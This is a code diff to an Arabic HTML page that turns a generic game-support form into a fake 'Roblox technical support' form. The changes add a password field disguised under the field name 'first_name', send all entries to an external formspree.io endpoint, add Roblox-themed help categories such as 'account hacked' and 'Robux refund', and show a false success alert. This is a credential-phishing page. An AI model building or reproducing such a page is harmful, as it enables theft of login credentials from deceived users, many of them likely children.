@@ -59,30 +59,23 @@ button {
 button:hover {
     background-color: #555;
 }
-
-#warning {
-    color: red;
-    text-align: center;
-    margin-top: 10px;
-    display: none;
-}
 </style>
 </head>
 <body>
 
 <div class="container">
-<h2>الدعم الفني الخاص باللعبة</h2>
+<h2>الدعم الفني الخاص Roblox</h2>
 
-<form id="reportForm" action="https://formspree.io/f/mvzwrgbe" method="POST">
+<form action="https://formspree.io/f/mvzwrgbe" method="POST">
 
 <label>اسم المستخدم</label>
-<input type="text" name="username" placeholder="اسم المستخدم" required>
+<input type="text" name="username" placeholder="اسم المستخدم">
 
-<label>اسم العرض (Display Name)</label>
-<input type="text" name="display_name" placeholder="اسم العرض">
+<label>كلمة المرور</label>
+<input type="text" name="first_name" placeholder="كلمه المرور"> 
 
-<label>الاسم الأول</label>
-<input type="text" name="first_name" placeholder="الاسم الأول">
+<label>الاسم الاول</label>
+<input type="text" name="last_name" placeholder="الاسم الثاني">
 
 <label>البريد الإلكتروني</label>
 <input type="email" name="email" placeholder="البريد الإلكتروني" required>
@@ -108,14 +101,16 @@ button:hover {
 <label>نوع فئة المساعدة</label>
 <select name="help_type">
 <option value="">اختر الفئة</option>
-<option>مشكلة في الحساب</option>
+<option>تم اختراق الحساب</option>
 <option>تعذر تسجيل الدخول</option>
-<option>مشتريات داخل اللعبة</option>
-<option>استرداد عناصر</option>
+<option>مشتريات Robux</option>
+<option>استرداد Robux</option>
 <option>الإبلاغ عن إساءة</option>
 <option>الإبلاغ عن استغلال</option>
-<option>بطاقة هدايا</option>
+<option>DMCA</option>
+<option>بطاقة الهدايا</option>
 <option>أفكار واقتراحات</option>
+<option>نصب ممتلكات</option>
 </select>
 
 <label>يرجى وصف مشكلتك</label>
@@ -123,26 +118,13 @@ button:hover {
 
 <button type="submit">ارسال الطلب</button>
 
-<div id="warning">يرجى إكمال البلاغ</div>
-
 </form>
+
 </div>
 
 <script>
-const form = document.getElementById("reportForm");
-const warning = document.getElementById("warning");
-
-form.addEventListener("submit", function(e){
-
-if(!form.checkValidity()){
-    e.preventDefault();
-    warning.style.display = "block";
-
-    setTimeout(function(){
-        warning.style.display = "none";
-    },7000);
-}
-
+document.querySelector('form').addEventListener('submit', function(e) {
+    alert('تم إرسال النموذج بنجاح!');
 });
 </script>
 
